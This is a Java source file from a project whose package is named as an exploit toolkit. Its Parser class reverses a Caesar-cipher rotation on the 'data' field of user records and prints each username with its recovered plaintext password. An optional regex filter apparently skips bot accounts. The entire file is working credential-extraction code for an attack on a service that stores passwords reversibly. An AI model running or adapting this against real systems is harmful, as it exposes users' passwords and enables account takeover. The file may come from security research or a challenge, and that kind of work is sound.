package fr.motysten.usertwist.exploit.tools;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Parser {

    private static final String regex = "(^[A-Z][A-Za-z]+[0-9][A-Z])|(^.*?([A-Z]|[0-9]{3}).*?[,?;.:/!§%*^¨$£+])";
    private static final Pattern pattern = Pattern.compile(regex);

    public static void getPass(JSONArray usersArray, int rotation, boolean ignoreBots) {
        for (int i = 0; i < usersArray.length(); i++) {
            parseJSON(usersArray, rotation, ignoreBots, i);
        }
    }

    public static void asyncGetPass(JSONArray usersArray, int rotation, boolean ignoreBots) throws InterruptedException {

        for (int i = 0; i < usersArray.length(); i++) {

            int finalI = i;

            Runnable r = () -> parseJSON(usersArray, rotation, ignoreBots, finalI);

            Thread t = Thread.startVirtualThread(r);
            t.join();
        }
    }

    private static void parseJSON(JSONArray usersArray, int rotation, boolean ignoreBots, int finalI) {
        JSONObject user = usersArray.getJSONObject(finalI);
        String login = user.getString("username");
        String password = Cesar.rotate(user.getString("data"), rotation);

        final Matcher matcher = pattern.matcher(password);
        if (!matcher.matches() || !ignoreBots) {
            System.out.println((finalI + 1) + ". " + login + " => " + password);
        }
    }

}
